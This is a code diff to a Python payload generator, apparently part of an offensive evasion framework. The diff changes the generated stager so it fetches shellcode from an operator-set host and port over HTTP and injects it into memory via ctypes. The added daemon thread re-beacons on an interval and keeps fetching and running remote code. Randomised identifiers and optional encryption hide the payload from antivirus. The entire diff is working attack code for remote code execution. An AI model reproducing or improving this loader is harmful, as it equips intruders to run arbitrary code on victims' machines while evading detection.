@@ -29,11 +29,12 @@ class Payload:
 	
 	def generate(self):
 
-		imports = "import sys; import urllib2; import ctypes; import time; import signal\n"
+		imports = "import sys; import urllib2; import ctypes; import time; import signal; import threading\n"
 
 		inject_func = helpers.randomString()
 		getexec_func = helpers.randomString()
 		main_func = helpers.randomString()
+		beaconthr_func = helpers.randomString()
 
 		retry_var = helpers.randomString()
 		if self.required_options["Beacon"][0].lower() == 'n':
@@ -63,32 +64,41 @@ class Payload:
 		url_var = helpers.randomString()
 		shellcode_var = helpers.randomString()
 		info_var = helpers.randomString()
+		thread_var = helpers.randomString()
+		thread_name = helpers.randomString()
+		thread_name2 = helpers.randomString()
 
 		getexec = "def %s(%s):" % (getexec_func, url_var)
-		getexec += "\n\t%s = %s.open(%s)" % (info_var, opener_var, url_var)
-		getexec += "\n\t%s = %s.read()" % (shellcode_var, info_var)
-		getexec += "\n\t%s = bytearray(%s)" % (shellcode_var, shellcode_var)
-		getexec += "\n\t%s(%s)\n" % (inject_func, shellcode_var)
+		getexec += "\n\ttry:"
+		getexec += "\n\t\t%s = %s.open(%s)" % (info_var, opener_var, url_var)
+		getexec += "\n\t\t%s = %s.read()" % (shellcode_var, info_var)
+		getexec += "\n\t\t%s = bytearray(%s)" % (shellcode_var, shellcode_var)
+		getexec += "\n\t\t%s(%s)" % (inject_func, shellcode_var)
+		getexec += "\n\texcept Exception:"
+		getexec += "\n\t\tpass\n"
 
 		url_var = helpers.randomString()
 
+		beaconthr = "def %s(%s):" % (beaconthr_func, url_var) 
+		beaconthr += "\n\twhile True:"
+		beaconthr += "\n\t\ttime.sleep(%s)" % interval_var
+		beaconthr += "\n\t\t%s = threading.Thread(name='%s', target=%s, args=(%s,))" % (thread_var, thread_name, getexec_func, url_var)
+		beaconthr += "\n\t\t%s.setDaemon(True)" % thread_var
+		beaconthr += "\n\t\t%s.start()\n" % thread_var
+
 		main = "def %s():" % main_func
 		main += "\n\t%s = 'http://%s:%s/%s'" % (url_var, self.required_options['DownloadHost'][0], self.required_options['DownloadPort'][0], self.required_options['DownloadName'][0])
-		main += "\n\ttry:"
-		main += "\n\t\t%s(%s)" % (getexec_func, url_var)
-		main += "\n\texcept Exception:"
-		main += "\n\t\tpass"
-
-		main += "\n\twhile %s is True:" % retry_var
-		main += "\n\t\ttry:"
-		main += "\n\t\t\t%s(%s)" % (getexec_func, url_var)
-		main += "\n\t\t\ttime.sleep(%s)" % interval_var
-		main += "\n\t\texcept Exception:"
-		main += "\n\t\t\tpass"
+		main += "\n\tif %s is True:" % retry_var
+		main += "\n\t\t%s = threading.Thread(name='%s', target=%s, args=(%s,))" % (thread_var, thread_name, beaconthr_func, url_var)
+		main += "\n\t\t%s.setDaemon(True)" % thread_var
+		main += "\n\t\t%s.start()" % thread_var
+		main += "\n\t%s(%s)" % (getexec_func, url_var)
+		main += "\n\twhile True:"
+		main += "\n\t\ttime.sleep(0.1)"
 		main += "\nif __name__ == '__main__':"
 		main += "\n\t%s()" % main_func
 
-		PayloadCode = imports + global_vars + inject + getexec + main
+		PayloadCode = imports + global_vars + inject + getexec + beaconthr + main
 
 		if self.required_options["use_pyherion"][0].lower() == "y":
 			PayloadCode = encryption.pyherion(PayloadCode)
